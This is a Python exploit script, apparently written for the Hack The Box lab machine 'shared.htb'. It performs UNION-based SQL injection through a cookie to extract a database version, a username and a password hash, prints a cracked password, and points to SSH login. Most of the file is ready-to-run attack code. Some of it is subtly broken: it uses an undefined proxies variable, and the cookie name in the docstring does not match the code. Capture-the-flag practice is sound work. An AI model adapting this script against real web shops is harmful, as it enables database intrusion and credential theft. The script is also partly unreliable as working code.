#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
from bs4 import BeautifulSoup


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)


args = parser.parse_args()

s = requests.Session()

def exploit_sqli(target, payload):
    """
    When we add something to the card it reflects into the checkout.shared.htb domain. 
    The content is reflected from the cookie, which means that any kind of injection might be in the cookie value: custom_card
    
    This function will include 3 steps: test the UNION SQL injection by retrieving the SQL database version, SQL injection payload to extract the username and SQL injection payload to extract the password 
    The SQL injection in this case is UNION-based, I've first discovered manually that we will have 3 collumns where we can extract information and see it reflecting in the web app
    Observing the web app, I can see that 2 of the 3 possible positions for the extraction are expecting an integer of probably limited length... so I'm limited to extract it in the second position, example:
    UNION ALL SELECT 1, @@version, 3-- -
    """

    url = "http://%s/" % target
    #proxies = { "http" : "127.0.0.1:8080" }

    if payload == "version":
        # UNION SQL Injection Payload => {"' UNION ALL SELECT NULL, @@version, NULL-- -":"1"}

        print("[INFO] Testing the web app for UNION-based SQL Injection in the 'custom_cart' cookie parameter")
        print("[INFO] Using the following UNION-based SQL Injection payload: {\"' UNION ALL SELECT NULL, @@version, NULL-- -\":\"1\"}")

        cookies = {
            "PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c": "def5020092bcc9cc595bd8ca01093cd3095c0c670bf440345386959ea14109a4dad2622c85e1ef4ddf5e6e5ccf238351233b392a0dda9adc05ecca0c7e5d338ef1f5b8f1ed7240ee66ff9cf4e1ae53711aca95acc7135d5fc24000187c1a0c582205567f25ccd94ff77516ea30e1bbb1283bfde6381bcfde53ee2c049a8714c127df0df90370d5c7b9d521c1964f22f902051ceecef46c2b7e943efc8f3d32a808fbd29e6f210c7c6514ce62a1f43a6abc728ba3b22790ca12eb45fd6c643e20b8dde94e1c8b2e345bc9c97d714d6f6137e46952f2b6e3962536036320fbc98f66f5822aca0b78713bfbc30f3d917751be9b9a3ea7f2c4d2e94557a783fa9b39fd82ec617905c5829413491299f72f50e31832b63ca7d5d9",
            "custom_cart": "%7b%22%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%20%40%40%76%65%72%73%69%6f%6e%2c%20%4e%55%4c%4c%2d%2d%20%2d%22%3a%22%31%22%7d"
        }

        r = s.get(url, proxies=proxies, cookies=cookies)

        soup = BeautifulSoup(r.text, 'html.parser')
        database_version = str(soup.findAll("td")[0].text)
        #print(database_version)
        
        if "Maria" in database_version:
            print("[SUCCESS] The SQL Injection worked, database version extracted: " + str(database_version)+ "\n")
        else:
            print("[ERROR] SQL Injection failed!")
            sys.exit(1)
    
    elif payload == "user":
        print("[INFO] Attempting to extract the username from the user table...")
        print("[INFO] Using the following UNION-based SQL Injection payload: {\"' UNION ALL SELECT 1, username, 3 from user-- -\":\"1\"}")

        cookies = {
            "PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c": "def5020092bcc9cc595bd8ca01093cd3095c0c670bf440345386959ea14109a4dad2622c85e1ef4ddf5e6e5ccf238351233b392a0dda9adc05ecca0c7e5d338ef1f5b8f1ed7240ee66ff9cf4e1ae53711aca95acc7135d5fc24000187c1a0c582205567f25ccd94ff77516ea30e1bbb1283bfde6381bcfde53ee2c049a8714c127df0df90370d5c7b9d521c1964f22f902051ceecef46c2b7e943efc8f3d32a808fbd29e6f210c7c6514ce62a1f43a6abc728ba3b22790ca12eb45fd6c643e20b8dde94e1c8b2e345bc9c97d714d6f6137e46952f2b6e3962536036320fbc98f66f5822aca0b78713bfbc30f3d917751be9b9a3ea7f2c4d2e94557a783fa9b39fd82ec617905c5829413491299f72f50e31832b63ca7d5d9",
            "custom_cart": "%7b%22'%20UNION%20ALL%20SELECT%201%2c%20username%2c%203%20from%20user--%20-%22%3a%221%22%7d"
        }

        r = s.get(url, cookies=cookies) # proxies=proxies

        soup = BeautifulSoup(r.text, 'html.parser')
        username = str(soup.findAll("td")[0].text)
        #print(database_version)
        
        # simple check
        if len(username) > 5:
            print("[SUCCESS] Username successfully extracted: " + str(username) + "\n")
            return username
        else:
            print("[ERROR] It was not possible to extract the username!")
            sys.exit(1)

        
    elif payload == "password":
        print("[INFO] Attempting to extract the password from the user table...")
        print("[INFO] Using the following UNION-based SQL Injection payload: {\"' UNION ALL SELECT 1, password, 3 from user-- -\":\"1\"}")

        cookies = {
            "PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c": "def5020092bcc9cc595bd8ca01093cd3095c0c670bf440345386959ea14109a4dad2622c85e1ef4ddf5e6e5ccf238351233b392a0dda9adc05ecca0c7e5d338ef1f5b8f1ed7240ee66ff9cf4e1ae53711aca95acc7135d5fc24000187c1a0c582205567f25ccd94ff77516ea30e1bbb1283bfde6381bcfde53ee2c049a8714c127df0df90370d5c7b9d521c1964f22f902051ceecef46c2b7e943efc8f3d32a808fbd29e6f210c7c6514ce62a1f43a6abc728ba3b22790ca12eb45fd6c643e20b8dde94e1c8b2e345bc9c97d714d6f6137e46952f2b6e3962536036320fbc98f66f5822aca0b78713bfbc30f3d917751be9b9a3ea7f2c4d2e94557a783fa9b39fd82ec617905c5829413491299f72f50e31832b63ca7d5d9",
            "custom_cart": "%7b%22'%20UNION%20ALL%20SELECT%201%2c%20password%2c%203%20from%20user--%20-%22%3a%221%22%7d"
        }

        r = s.get(url, proxies=proxies, cookies=cookies)

        soup = BeautifulSoup(r.text, 'html.parser')
        password = str(soup.findAll("td")[0].text)
        
        
        # simple check
        if len(password) > 5:
            print("[SUCCESS] Password successfully extracted: " + str(password))
            print("[SUCCESS] But...this is just a MD5 hash of the cleartext password: Soleil101"+ "\n")
            return password
        else:
            print("[ERROR] It was not possible to extract the password!")
            sys.exit(1)
    


def main():
    answer = str(input("Before starting, did you already added both shared.htb and checkout.shared.htb to the /etc/hosts? (yes/no)"))

    if answer == "yes":
        exploit_sqli(args.target, "version")
        username = exploit_sqli(args.target, "user")
        password = exploit_sqli(args.target, "password")
        print("[INFO] Next step should be trying this set of credentials " + str(username)+":Soleil101 against the SSH service running on the machine ;) ")
        

    else:
        print("[INFO] Please add both checkout.shared.htb and shared.htb to the /etc/hosts file")
        sys.exit(0)

if __name__ == "__main__":
    main()